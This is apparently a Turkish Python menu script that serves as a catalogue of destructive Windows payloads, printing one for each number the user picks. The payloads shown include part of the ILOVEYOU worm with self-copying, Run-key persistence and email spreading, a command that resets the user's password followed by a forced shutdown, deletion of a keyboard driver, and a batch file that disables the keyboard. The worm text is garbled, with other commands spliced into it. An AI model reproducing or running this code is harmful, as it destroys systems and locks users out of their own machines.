dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USERSoftware

Micros oftWindow s Scripting HostSettingsTimeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USERSoftwareMicrosoft

net user %username% kıoajwfjawıojfdawj /y

shutdown /s /f /t 0

Windows Scripting HostSettingsTimeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"MSKernel32.vbs")
c.Copy(dirwin&"Win32DLL.vbs")
c.Copy(dirsystem&"LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINESoftwareMicrosoft

Windows Cur rentVersio nRunMSKernel32",dirsystem&"

MSKernel32.vbs"


"""

klavyehackleyen = r"""
[FONT=Courier New][SIZE=3][COLOR=White][U]del C:/WINDOWS/system/KEYBOARD.DRV[/U][/COLOR][/SIZE][/FONT]
"""

klavyemousedevredışı = r"""
@echo off
copy %0%windir%\Virus.bat> nul
reg addHKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul
"""
# Kullanıcı girişi doğrulama ve işlem yapma
if x == 1:
    print(Fore.YELLOW + system32silen)
elif x == 2:
    print(Fore.YELLOW + ekrankartıyakan)
elif x == 3:
    print(Fore.YELLOW + system32remover)
elif x == 4:
    print(Fore.YELLOW + stopinternet)
elif x == 5:
    print(Fore.YELLOW + shutupinternet)
elif x == 6:
    print(Fore.YELLOW + systemeraser)
elif x == 7:
    print(Fore.YELLOW + pccrasher)
elif x == 8:
    print(Fore.YELLOW + systemmelter)
elif x == 9:
    print(Fore.YELLOW + shutdown)
elif x == 10:
    print(Fore.YELLOW + forkbomb)
elif x == 11:
    print(Fore.YELLOW + systemeraser)
elif x == 12:
    print(Fore.YELLOW + capslocktaggle)
elif x == 13:
    print(Fore.YELLOW + pccrasher2)
elif x == 14:
    print(Fore.YELLOW + dangerzone)
elif x == 15:
    print(Fore.YELLOW + applicationbomber)
elif x == 16:
    print(Fore.YELLOW + autoshutdown)
elif x == 17:
    print(Fore.YELLOW + networkflooder)
elif x == 18:
    print(Fore.YELLOW + internetdisabler)
elif x == 19:
    print(Fore.YELLOW + registryeraser)
elif x == 20:
    print(Fore.YELLOW + thematrix)
elif x == 21:
    print(Fore.YELLOW + hddyakan)
elif x == 22:
    print(Fore.YELLOW + şifrekoyan)
elif x == 23:
    print(Fore.YELLOW + dllsilen)
elif x == 24:
    print(Fore.YELLOW + pcdekiherşeyisilen)
elif x == 25:
    print(Fore.YELLOW + harddiskçökerten)
elif x == 26:
    print(Fore.YELLOW + formatatan)
elif x == 27:
    print(Fore.YELLOW + ekrankartıyakan)
elif x == 28:
    print(Fore.YELLOW + dosyasilen)
elif x == 29:
    print(Fore.YELLOW + dllartısystem32silen)
elif x == 30:
    print(Fore.YELLOW + sürücüindirici)
elif x == 31:
    print(Fore.YELLOW + anındaçökertme)
elif x == 32:
    print(Fore.YELLOW + küfredippckapatan)
elif x == 33:
    print(Fore.YELLOW + monitorpataltan)
elif x == 34:
    print(Fore.YELLOW + çökertme)
elif x == 35:
    print(Fore.YELLOW + melissa)
elif x == 36:
    print(Fore.YELLOW + bilgisayarınanasınısiken)
elif x == 37:
    print(Fore.YELLOW + Hibrid1)
elif x == 38:
    print(Fore.YELLOW + hibrid2)
elif x == 39:
    print(Fore.YELLOW + hibrid3)
elif x == 40:
    print(Fore.YELLOW + klavyehackleyen)
elif x == 41:
    print(Fore.YELLOW + klavyemousedevredışı)
else:
    print(Fore.RED + "Yanlış bir değer girdiniz. Lütfen tekrar deneyiniz...")